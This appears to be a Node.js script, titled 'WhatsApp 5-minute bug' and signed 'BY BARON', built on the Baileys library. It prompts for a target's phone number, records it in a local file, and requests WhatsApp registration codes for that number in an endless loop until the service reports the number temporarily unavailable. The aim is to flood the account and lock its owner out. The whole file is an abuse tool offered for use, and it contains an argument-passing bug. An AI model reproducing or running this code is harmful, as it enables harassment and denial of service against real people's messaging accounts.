const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')


const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async (phoneNumber, ddi, number) => {

  const { state } = await useMultiFileAuthState('.mm')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  console.clear();
 
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          console.log(gradient('red', 'red')(`BY BARON: +${res.login}`));
          setTimeout(async () => {
          }, 2000)
          return;
        }
      } catch (error) {
        console.log(error)
      }
    }

  
 
}

 console.log(gradient('cyan', 'cyan')('WhatsApp 5-minute bug'))
  let ddi = prompt(gradient('purple', 'cyan')('[+] Country Code: '));
  let number = prompt(gradient('purple', 'cyan')('[+] Number Without Country Code: '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  start({ phoneNumber, ddi, number })
